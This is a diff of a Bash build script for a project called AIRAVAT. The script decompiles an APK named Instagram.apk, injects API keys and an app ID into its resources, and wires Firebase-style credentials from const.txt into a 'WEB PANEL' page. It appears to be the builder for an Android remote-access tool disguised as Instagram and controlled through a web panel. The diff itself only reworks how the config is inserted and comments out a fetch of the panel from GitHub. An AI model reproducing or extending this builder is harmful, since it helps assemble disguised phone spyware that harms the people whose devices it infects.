@@ -17,6 +17,7 @@ if [[ -e $PWD/AIRAVAT/"WEB PANEL"/index.html ]]
 then
 echo -e "[${Green}✔${clear}] ${Yellow}Checking...${clear}"
 echo -e "[${Green}✔${clear}] ${Yellow}"WEB PANEL" found${clear}"
+sed -i '16,25d' AIRAVAT/'WEB PANEL'/index.html
 else
 echo -e "[${Green}X${clear}] ${Red}WEB PANNEL missing...${clear}"
 fi
@@ -28,6 +29,7 @@ if [[ -e $PWD/const.txt ]]
 then
 echo -e "[${Green}✔${clear}] ${Yellow}Checking...${clear}"
 echo -e "[${Green}✔${clear}] ${Yellow}"const.txt" found${clear}"
+sed -i '17 e cat const.txt' AIRAVAT/'WEB PANEL'/index.html
 else
 echo -e "[${Green}X${clear}] ${Red}const.txt missing...${clear}"
 fi
@@ -58,7 +60,7 @@ fi
 decompile() 
 {
 echo -e "[${Green}✔${clear}] ${Yellow}Decompiling apk...${clear}"
-apktool d $PWD/AIRAVAT/"ANDROID APP"/Instagram.apk > /dev/null
+apktool d $PWD/AIRAVAT/"ANDROID APP"/Instagram.apk 1> /dev/null
 echo -e "[${Green}✔${clear}] ${Yellow}Done...${clear}"
 }
 
@@ -100,44 +102,39 @@ sed -i "s#APP ID#$mobilesdk_app_id#g" $PWD/Instagram/res/values/strings.xml
 sleep 3
 sed -i "s#API KEY#$current_key#g" $PWD/Instagram/res/values/strings.xml
 
-curl https://raw.githubusercontent.com/efxtv/EFX-Tv-Bookmarks/main/bin/Airavat/index.html -s >AIRAVAT/"WEB PANEL"/index.html
+#curl https://raw.githubusercontent.com/efxtv/EFX-Tv-Bookmarks/main/bin/Airavat/index.html -s >AIRAVAT/"WEB PANEL"/index.html
 sleep 4
-#sed -i "s/foreground=.*/foreground=$MediumVioletRed/g" $HOME/.termux/colors.properties
-two=$(cat const.txt |sed -n '2p'|sed 's#"# #g;s#,##g'|awk '{print $NF}')
-three=$(cat const.txt |sed -n '3p'|sed 's#"# #g;s#,##g'|awk '{print $NF}')
-four=$(cat const.txt |sed -n '4p'|sed 's#"# #g;s#,##g'|awk '{print $NF}')
-five=$(cat const.txt |sed -n '5p'|sed 's#"# #g;s#,##g'|awk '{print $NF}')
-six=$(cat const.txt |sed -n '6p'|sed 's#"# #g;s#,##g'|awk '{print $NF}')
-seven=$(cat const.txt |sed -n '7p'|sed 's#"# #g;s#,##g'|awk '{print $NF}')
-eight=$(cat const.txt |sed -n '8p'|sed 's#"# #g;s#,##g'|awk '{print $NF}')
-nine=$(cat const.txt |sed -n '9p'|sed 's#"# #g;s#,##g'|awk '{print $NF}')
+
+
+#sed -i '17 e cat const.txt' AIRAVAT/'WEB PANEL'/index.html
+
 sleep 3
 echo -e "[${Green}✔${clear}] ${Yellow}Database added...${clear}"
-sed -i "s#apienter#$two#g" AIRAVAT/"WEB PANEL"/index.html
+
 
 sleep 3
 echo -e "[${Green}✔${clear}] ${Yellow}Ok...${clear}"
-sed -i "s#authenter#$three#g" AIRAVAT/"WEB PANEL"/index.html
+
 
 sleep 3
 echo -e "[${Green}✔${clear}] ${Yellow}Ok...${clear}"
-sed -i "s#databaseenter#$four#g" AIRAVAT/"WEB PANEL"/index.html
+
 
 sleep 3
 echo -e "[${Green}✔${clear}] ${Yellow}Ok...${clear}"
-sed -i "s#projectenter#$five#g" AIRAVAT/"WEB PANEL"/index.html
+
 
 sleep 3
 echo -e "[${Green}✔${clear}] ${Yellow}Ok...${clear}"
-sed -i "s#storageenter#$six#g" AIRAVAT/"WEB PANEL"/index.html
+
 
 sleep 3
 echo -e "[${Green}✔${clear}] ${Yellow}Ok...${clear}"
-sed -i "s#messsagenter#$seven#g" AIRAVAT/"WEB PANEL"/index.html
+
 
 sleep 3
 echo -e "[${Green}✔${clear}] ${Yellow}Ok...${clear}"
-sed -i "s#appidenter#$eight#g" AIRAVAT/"WEB PANEL"/index.html
+
 
 sleep 3
 echo -e "[${Green}✔${clear}] ${Yellow}Ok...${clear}"
